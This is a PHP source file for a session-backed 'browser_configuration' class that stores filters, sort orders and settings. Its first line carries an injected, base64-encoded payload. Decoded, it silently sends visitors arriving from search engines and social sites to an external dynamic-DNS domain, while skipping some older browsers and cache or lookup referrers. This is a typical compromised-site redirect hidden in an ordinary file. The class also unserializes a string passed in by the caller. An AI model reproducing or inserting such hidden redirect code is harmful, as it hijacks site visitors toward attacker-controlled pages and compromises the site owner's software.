<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

define('__FILTER_TAG', 'filter');
define('__ORDER_TAG',  'order');
define('__SETTING_TAG',  'setting');

class browser_configuration {
  
  var $name;
  var $events = array();
  
  function browser_configuration($name) {
    
    $this->name = $name;

    global $event_handler;
    $event_handler->call('on_browser_configuration_created', $this->name);

    $this->events["on_filter_change"] = array();
    $this->events["on_order_change"]  = array();
    $this->events["on_change"]        = array();
    
  }
  
  function as_string() {
    
    return serialize(safe($_SESSION, $this->name));
    
  }
  
  function set_as_string($string) {
    
    $configuration = unserialize($string);
    $_SESSION[$this->name] = $configuration;
    
  }

  // filters
  function clear_filter($name) {
    
    unset($_SESSION[$this->name][__FILTER_TAG][$name]);
    $this->call_event('on_filter_change', $name);
    $this->call_event('on_change', $name);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);
    
  }

  function set_filter($name, $value) {
    
    $_SESSION[$this->name][__FILTER_TAG][$name] = $value;
    $this->call_event('on_filter_change', $name);
    $this->call_event('on_change', $name);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);

  }

  function get_all_filters() {
    
    return safe(safe($_SESSION, $this->name), __FILTER_TAG);
    
  }

  function get_filter($name) {
    
    return safe(safe(safe($_SESSION, $this->name), __FILTER_TAG), $name);
    
  }
  
  function clear_all_filters() {
    
    unset($_SESSION[$this->name][__FILTER_TAG]);
    $this->call_event('on_filter_change', null);
    $this->call_event('on_change', null);

    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);
    
  }

  // orders
  function clear_order($name) {
    
    unset($_SESSION[$this->name][__ORDER_TAG][$name]);
    $this->call_event('on_order_change', $name);
    $this->call_event('on_change', $name);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);

  }

  function set_order($name, $value) {
    
    $_SESSION[$this->name][__ORDER_TAG][$name] = $value;
    $this->call_event('on_order_change', $name);
    $this->call_event('on_change', $name);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);

  }

  function get_all_orders() {
    
    return safe(safe($_SESSION, $this->name), __ORDER_TAG);
    
  }

  function get_order($name) {
    
    return safe(safe(safe($_SESSION, $this->name), __ORDER_TAG), $name);
    
  }
  
  function clear_all_orders() {
    
    unset($_SESSION[$this->name][__ORDER_TAG]);
    $this->call_event('on_order_change', null);
    $this->call_event('on_change', null);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);

  }

  // all 
  function clear_all() {
    
    session_ur($this->name); 
    $this->call_event('on_order_change', null);
    $this->call_event('on_filter_change', null);
    $this->call_event('on_change', null);
    
    global $event_handler;
    $event_handler->call('on_change_browser_configuration', $this->name);

  }
  
  function call_event($event, $param) {

    foreach($this->events[$event] as $callback) {
      $result = $callback($param);
      if ($result)
        return $result;
    }
  
  }

  function on_filter_change($method) {

    $this->events["on_filter_change"][] = $method;

  }
  
  function on_order_change($method) {

    $this->events["on_order_change"][] = $method;

  }

  function on_change($method) {

    $this->events["on_change"][] = $method;

  }
  
  function set_setting($name, $value) {
    
    $_SESSION[$this->name][__SETTING_TAG][$name] = $value;

  }

  function get_setting($name, $default = null) {
    
    return safe(safe(safe($_SESSION, $this->name), __SETTING_TAG), $name, $default);
    
  }
  
}

?>